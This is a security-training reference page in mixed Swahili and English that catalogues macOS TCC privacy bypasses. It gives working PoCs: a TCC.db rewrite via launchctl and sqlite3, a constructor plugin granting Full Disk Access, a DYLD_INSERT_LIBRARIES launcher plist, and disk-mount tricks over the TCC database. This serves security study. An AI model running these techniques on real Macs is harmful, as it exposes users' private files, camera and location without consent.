# macOS TCC Bypasses

{{#include ../../../../../banners/hacktricks-training.md}}

## Kwa utendaji

### Write Bypass

Hii si bypass, ni jinsi TCC inavyofanya kazi: **Haizuii kuandika**. Ikiwa Terminal **haina ruhusa ya kusoma Desktop ya mtumiaji**, bado inaweza kuandika ndani yake:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
The **extended attribute `com.apple.macl`** huongezwa kwenye **file** mpya ili kuipa **creators app** access ya kuisoma.

### TCC ClickJacking

Inawezekana **kuweka window juu ya TCC prompt** ili kumfanya mtumiaji **aikubali** bila kutambua. Unaweza kupata PoC kwenye [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Request by arbitrary name

Attacker anaweza **kuunda apps zenye jina lolote** (kwa mfano Finder, Google Chrome...) kwenye **`Info.plist`** na kuzifanya ziombe access kwenye location inayolindwa na TCC. Mtumiaji atadhani kuwa application halali ndiyo inayoomba access hii.\
Zaidi ya hayo, inawezekana **kuondoa app halali kwenye Dock na kuweka fake app hapo**, ili mtumiaji anapobofya fake app (ambayo inaweza kutumia icon ileile) iweze kuita app halali, kuomba TCC permissions na ku-execute malware, na kumfanya mtumiaji aamini kuwa app halali ndiyo iliyoomba access hiyo.

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Maelezo zaidi na PoC ziko kwenye:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

Kwa default, access kupitia **SSH ilikuwa na "Full Disk Access"**. Ili kuizima, unahitaji iwe kwenye orodha lakini iwe disabled (kuiondoa kwenye orodha hakutaondoa privileges hizo):

![TCC Request by arbitrary name - SSH Bypass: Kwa default, access kupitia SSH ilikuwa na "Full Disk Access" . Ili kuizima, unahitaji iwe kwenye orodha lakini iwe disabled (kuiondoa...](<../../../../../images/image (1077).png>)

Hapa unaweza kupata mifano ya jinsi baadhi ya **malwares zimeweza kubypass protection hii**:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

> [!CAUTION]
> Kumbuka kwamba sasa, ili uweze kuwezesha SSH unahitaji **Full Disk Access**

### Handle extensions - CVE-2022-26767

Attribute **`com.apple.macl`** hupewa files ili kuipa **application fulani permission ya kuisoma.** Attribute hii huwekwa wakati wa **drag\&drop** file kwenye app, au mtumiaji anapofanya **double-click** kwenye file ili kuifungua kwa **default application**.

Kwa hiyo, mtumiaji angeweza **kusajili malicious app** ili ishughulikie extensions zote na kuita Launch Services ili **ifungue** file yoyote (hivyo malicious file itapewa access ya kusomwa).

### iCloud

Entitlement **`com.apple.private.icloud-account-access`** inaweza kutumika kuwasiliana na **`com.apple.iCloudHelper`** XPC service ambayo **itatoa iCloud tokens**.

**iMovie** na **Garageband** zilikuwa na entitlement hii pamoja na nyingine zilizoruhusu.

Kwa **information** zaidi kuhusu exploit ya **kupata icloud tokens** kupitia entitlement hiyo, angalia talk: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automation

App iliyo na permission ya **`kTCCServiceAppleEvents`** itaweza **kudhibiti Apps nyingine**. Hii inamaanisha kwamba inaweza **kutumia vibaya permissions zilizopewa Apps nyingine**.

Kwa maelezo zaidi kuhusu Apple Scripts, angalia:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

Kwa mfano, ikiwa App ina **Automation permission juu ya `iTerm`**, kama ilivyo kwenye mfano huu, **`Terminal`** ina access juu ya iTerm:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Over iTerm

Terminal, ambayo haina FDA, inaweza kuita iTerm, ambayo inayo, na kuitumia kutekeleza actions:
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### Kupitia Finder

Au ikiwa App ina access kupitia Finder, inaweza kutumia script kama hii:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## Kwa tabia ya App

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

**`tccd daemon`** ya **userland** ilikuwa ikitumia variable ya **`HOME`** ya **env** kufikia database ya watumiaji ya TCC kutoka: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Kulingana na [this Stack Exchange post](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686), na kwa sababu TCC daemon inaendeshwa kupitia **`launchd`** ndani ya domain ya mtumiaji wa sasa, inawezekana **kudhibiti environment variables zote** zinazopitishwa kwake.\
Kwa hivyo, **attacker angeweza kuweka environment variable ya `$HOME`** katika **`launchctl`** ili ielekeze kwenye **directory** inayodhibitiwa, **kuanzisha upya** **TCC** daemon, kisha **kubadilisha moja kwa moja database ya TCC** ili kujipa **TCC entitlement** zote zinazopatikana bila hata kumwomba mtumiaji wa mwisho ruhusa.\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notes

Notes ilikuwa na access kwa maeneo yaliyolindwa na TCC, lakini note inapoundwa, **huundwa katika eneo lisilolindwa**. Kwa hiyo, ungeweza kuiomba Notes inakili file iliyolindwa kwenye note (yaani katika eneo lisilolindwa) na kisha ku-access file hiyo:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

Binary `/usr/libexec/lsd` pamoja na library `libsecurity_translocate` ilikuwa na entitlement `com.apple.private.nullfs_allow`, ambayo iliiruhusu kuunda mount ya **nullfs**, na ilikuwa na entitlement `com.apple.private.tcc.allow` yenye **`kTCCServiceSystemPolicyAllFiles`** ili ku-access kila file.

Iliwezekana kuongeza quarantine attribute kwenye "Library", kuita **`com.apple.security.translocation`** XPC service, na kisha inge-map Library kwenye **`$TMPDIR/AppTranslocation/d/d/Library`**, ambako documents zote ndani ya Library zingeweza **ku-accessiwa**.

### CVE-2023-38571 - Music & TV <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

**`Music`** ina feature ya kuvutia: Inapoendeshwa, **hu-import** files zinazowekwa kwenye **`~/Music/Music/Media.localized/Automatically Add to Music.localized`** ndani ya "media library" ya user. Zaidi ya hayo, inaita kitu kama: **`rename(a, b);`** ambapo `a` na `b` ni:

- `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
- `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3"`

Hii **`rename(a, b);`** behaviour iko vulnerable kwa **Race Condition**, kwa sababu inawezekana kuweka fake **TCC.db** file ndani ya folder ya `Automatically Add to Music.localized`, na kisha folder mpya (b) inapoundwa kunakili file hiyo, kuifuta, na kuielekeza kwenye **`~/Library/Application Support/com.apple.TCC`**/.
**Maelezo zaidi** [**kwenye writeup**](https://gergelykalman.com/CVE-2023-38571-a-macOS-TCC-bypass-in-Music-and-TV.html)


### SQLITE_SQLLOG_DIR - CVE-2023-32422

Ikiwa **`SQLITE_SQLLOG_DIR="path/folder"`** imewekwa, kimsingi inamaanisha kwamba **db yoyote iliyo-open inanakiliwa kwenye hiyo path**. Katika CVE hii, control hii ilitumika vibaya **kuandika** ndani ya **SQLite database** ambayo ita-**open** na process yenye FDA kwenye TCC database, na kisha kutumia vibaya **`SQLITE_SQLLOG_DIR`** pamoja na **symlink kwenye filename**, ili database hiyo **inapo-open**, user **TCC.db iwe overwritten** na database iliyokuwa ime-open.\
**Maelezo zaidi** [**kwenye writeup**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **na**[ **kwenye talk**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y&t=20548s).

### **SQLITE_AUTO_TRACE**

Ikiwa environment variable **`SQLITE_AUTO_TRACE`** imewekwa, library **`libsqlite3.dylib`** itaanza **ku-log** SQL queries zote. Applications nyingi zilitumia library hii, kwa hiyo iliwezekana ku-log SQLite queries zao zote.

Applications kadhaa za Apple zilitumia library hii ku-access taarifa zilizolindwa na TCC.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### MTL_DUMP_PIPELINES_TO_JSON_FILE - CVE-2023-32407

Hii **env variable inatumiwa na `Metal` framework** ambayo ni dependency ya programs mbalimbali, hasa `Music`, ambayo ina FDA.

Kuweka ifuatayo: `MTL_DUMP_PIPELINES_TO_JSON_FILE="path/name"`. Ikiwa `path` ni directory halali, bug itatrigger na tunaweza kutumia `fs_usage` kuona kinachoendelea kwenye program:

- file ita-`open()`-iwa, ikiitwa `path/.dat.nosyncXXXX.XXXXXX` (X ni random)
- `write()` moja au zaidi zitaandika contents kwenye file (hatuwezi kudhibiti hili)
- `path/.dat.nosyncXXXX.XXXXXX` ita-`renamed()`-iwa kuwa `path/name`

Ni temporary file write, ikifuatiwa na **`rename(old, new)`** **ambayo si secure.**

Si secure kwa sababu inapaswa **kuresolve old na new paths tofauti**, jambo ambalo linaweza kuchukua muda na kuwa vulnerable kwa Race Condition. Kwa maelezo zaidi unaweza kuangalia `xnu` function `renameat_internal()`.

> [!CAUTION]
> Kimsingi, ikiwa privileged process ina-rename kutoka kwenye folder unayodhibiti, unaweza kushinda RCE na kuifanya ifikie file tofauti au, kama ilivyo kwenye CVE hii, ifungue file iliyoundwa na privileged app na ihifadhi FD.
>
> Ikiwa rename inafikia folder unayodhibiti, wakati umebadilisha source file au una FD yake, unabadilisha destination file (au folder) ili ielekeze kwenye symlink, hivyo unaweza kuandika wakati wowote unaotaka.

Hii ndiyo ilikuwa attack kwenye CVE: Kwa mfano, ili ku-overwrite user's `TCC.db`, tunaweza:

- kuunda `/Users/hacker/ourlink` ili ielekeze kwenye `/Users/hacker/Library/Application Support/com.apple.TCC/`
- kuunda directory `/Users/hacker/tmp/`
- kuweka `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db`
- ku-trigger bug kwa kuendesha `Music` ikiwa na env var hii
- kunasa `open()` ya `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX` (X ni random)
- hapa pia tuna-`open()` file hii kwa ajili ya kuandika, na kuendelea kushikilia file descriptor
- kubadilisha `/Users/hacker/tmp` na `/Users/hacker/ourlink` atomically **kwenye loop**
- tunafanya hivi ili kuongeza uwezekano wetu wa kufanikiwa kwa sababu race window ni ndogo sana, lakini kushindwa kwenye race hakuna hasara kubwa
- kusubiri kidogo
- ku-test ikiwa tulibahatika
- ikiwa sivyo, kuanza tena kutoka mwanzo

Maelezo zaidi kwenye [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)

> [!CAUTION]
> Sasa, ukijaribu kutumia env variable `MTL_DUMP_PIPELINES_TO_JSON_FILE`, apps hazita-launch

### Apple Remote Desktop

Ukiwa root unaweza ku-enable service hii na **ARD agent itakuwa na full disk access**, ambayo baadaye inaweza kutumiwa vibaya na user ili kuifanya copy **TCC user database** mpya.

## By **NFSHomeDirectory**

TCC hutumia database iliyo kwenye HOME folder ya user kudhibiti access ya resources maalum kwa user kwenye **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Kwa hiyo, ikiwa user ataweza kurestart TCC ikiwa na $HOME env variable inayoelekeza kwenye **folder tofauti**, user anaweza kuunda TCC database mpya kwenye **/Library/Application Support/com.apple.TCC/TCC.db** na ku-trick TCC itoe TCC permission yoyote kwa app yoyote.

> [!TIP]
> Kumbuka kwamba Apple hutumia setting iliyohifadhiwa ndani ya user profile kwenye **`NFSHomeDirectory`** attribute kama **value ya `$HOME`**, kwa hiyo, ukicompromise application yenye permissions za kubadilisha value hii (**`kTCCServiceSystemPolicySysAdminFiles`**), unaweza **kuweaponize** option hii kwa TCC bypass.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**first POC** inatumia [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) na [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) kubadilisha **HOME** folder ya user.

1. Pata _csreq_ blob ya target app.
2. Panda fake _TCC.db_ file yenye access inayohitajika na _csreq_ blob.
3. Export Directory Services entry ya user ukitumia [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Badilisha Directory Services entry ili kubadilisha home directory ya user.
5. Import Directory Services entry iliyorekebishwa ukitumia [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Simamisha user’s _tccd_ na u-reboot process.

POC ya pili ilitumia **`/usr/libexec/configd`** ambayo ilikuwa na `com.apple.private.tcc.allow` yenye value `kTCCServiceSystemPolicySysAdminFiles`.\
Iliwezekana ku-run **`configd`** ikiwa na option ya **`-t`**, attacker angeweza kubainisha **custom Bundle ya ku-load**. Kwa hiyo, exploit **inachukua nafasi ya** method ya **`dsexport`** na **`dsimport`** ya kubadilisha home directory ya user kwa **`configd` code injection**.

Kwa maelezo zaidi angalia [**original report**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).

## By process injection

Kuna techniques tofauti za ku-inject code ndani ya process na kutumia vibaya TCC privileges zake:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Zaidi ya hayo, process injection inayopatikana mara nyingi zaidi ya kubypass TCC ni kupitia **plugins (load library)**.\
Plugins ni code ya ziada kwa kawaida katika mfumo wa libraries au plist, ambayo **ita-loadiwa na main application** na kutekelezwa chini ya context yake. Kwa hiyo, ikiwa main application ilikuwa na access ya TCC restricted files (kupitia permissions au entitlements zilizotolewa), **custom code pia itakuwa nayo**.

### CVE-2020-27937 - Directory Utility

Application `/System/Library/CoreServices/Applications/Directory Utility.app` ilikuwa na entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, ilipakia plugins zenye extension **`.daplug`** na **haikuwa na hardened** runtime.

Ili kuweaponize CVE hii, **`NFSHomeDirectory`** **inabadilishwa** (kwa kutumia entitlement ya awali vibaya) ili kuweza **kuchukua udhibiti wa TCC database za users** na kubypass TCC.

Kwa maelezo zaidi angalia [**original report**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).

### CVE-2020-29621 - Coreaudiod

Binary **`/usr/sbin/coreaudiod`** ilikuwa na entitlements `com.apple.security.cs.disable-library-validation` na `com.apple.private.tcc.manager`. Ya kwanza **iliruhusu code injection** na ya pili ikiipa access ya **kumanage TCC**.

Binary hii iliruhusu ku-load **third party plug-ins** kutoka folder `/Library/Audio/Plug-Ins/HAL`. Kwa hiyo, iliwezekana **ku-load plugin na kutumia vibaya TCC permissions** kwa PoC hii:
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Kwa maelezo zaidi, angalia [**ripoti ya awali**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).

### Device Abstraction Layer (DAL) Plug-Ins

System applications zinazofungua camera stream kupitia Core Media I/O (apps zenye **`kTCCServiceCamera`**) hupakia **plugins hizi ndani ya process** kutoka `/Library/CoreMediaIO/Plug-Ins/DAL` (haizuiliwi na SIP).

Kuhifadhi tu library yenye **constructor** ya kawaida humo kutatosha **ku-inject code**.

Apple applications kadhaa zilikabiliwa na tatizo hili.

### Firefox

Firefox application ilikuwa na entitlements za `com.apple.security.cs.disable-library-validation` na `com.apple.security.cs.allow-dyld-environment-variables`:
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Kwa maelezo zaidi kuhusu jinsi ya ku-exploit hii kwa urahisi, [**angalia report ya awali**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).

### CVE-2020-10006

Binary `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` ilikuwa na entitlements **`com.apple.private.tcc.allow`** na **`com.apple.security.get-task-allow`**, ambazo ziliruhusu ku-inject code ndani ya process na kutumia TCC privileges.

### CVE-2023-26818 - Telegram

Telegram ilikuwa na entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** na **`com.apple.security.cs.disable-library-validation`**, hivyo iliwezekana kuitumia vibaya ili **kupata access kwenye permissions zake**, kama vile kurekodi kwa kutumia camera. Unaweza [**kupata payload kwenye writeup**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

Kumbuka kwamba, ili kutumia env variable kupakia library, **custom plist** iliundwa kwa ajili ya ku-inject library hii, na **`launchctl`** ilitumika kuizindua:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## Kupitia miito ya open

Inawezekana kuita **`open`** hata ukiwa ndani ya sandbox

### Scripts za Terminal

Ni jambo la kawaida kuwapa **Terminal** ruhusa ya **Full Disk Access (FDA)**, hasa kwenye kompyuta zinazotumiwa na watu wa teknolojia. Pia inawezekana kuita scripts za **`.terminal`** kupitia ruhusa hiyo.

Scripts za **`.terminal`** ni faili za plist kama hii, zikiwa na command ya kutekelezwa kwenye key ya **`CommandString`**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Programu inaweza kuandika script ya terminal katika eneo kama vile /tmp na kuiendesha kwa command kama vile:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## Kwa ku-mount

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Mtumiaji yeyote** (hata wasio na privileges) anaweza kuunda na ku-mount snapshot ya Time Machine na **kufikia faili ZOTE** za snapshot hiyo.\
**Privilege pekee** inayohitajika ni kwamba application inayotumika (kama `Terminal`) iwe na **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), ambayo lazima itolewe na admin.
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
Maelezo ya kina zaidi yanaweza [**kupatikana katika ripoti ya awali**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

### CVE-2021-1784 & CVE-2021-30808 - Mount juu ya faili ya TCC

Hata kama faili ya TCC DB imelindwa, iliwezekana **ku-mount juu ya directory** faili mpya ya TCC.db:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Angalia **full exploit** katika [**original writeup**](https://theevilbit.github.io/posts/cve-2021-30808/).

### CVE-2024-40855

Kama ilivyoelezwa katika [original writeup](https://www.kandji.io/blog/macos-audit-story-part2), CVE hii ilitumia vibaya `diskarbitrationd`.

Function `DADiskMountWithArgumentsCommon` kutoka kwenye public `DiskArbitration` framework ilifanya security checks. Hata hivyo, inawezekana kuipita kwa kuita moja kwa moja `diskarbitrationd`, na hivyo kutumia vipengele vya `../` kwenye path pamoja na symlinks.

Hili lilimwezesha attacker kufanya arbitrary mounts katika location yoyote, ikiwemo juu ya TCC database kwa sababu ya entitlement `com.apple.private.security.storage-exempt.heritable` ya `diskarbitrationd`.

### asr

Tool **`/usr/sbin/asr`** iliruhusu kunakili disk nzima na kui-mount katika location nyingine, huku ikipita TCC protections.

### Location Services

Kuna TCC database ya tatu katika **`/var/db/locationd/clients.plist`** inayoonyesha clients zinazoruhusiwa **access location services**.\
Folder **`/var/db/locationd/` haikulindwa dhidi ya DMG mounting**, hivyo iliwezekana ku-mount plist yetu wenyewe.

## Kupitia startup apps


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## Kupitia grep

Katika matukio kadhaa, files zitahifadhi taarifa nyeti kama emails, phone numbers, messages... katika locations zisizolindwa (ambalo huhesabiwa kuwa vulnerability katika Apple).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

Hii haifanyi kazi tena, lakini [**ilifanya kazi zamani**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

Njia nyingine inayotumia [**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## Marejeo

- [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [**20+ Ways to Bypass Your macOS Privacy Mechanisms**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)

{{#include ../../../../../banners/hacktricks-training.md}}
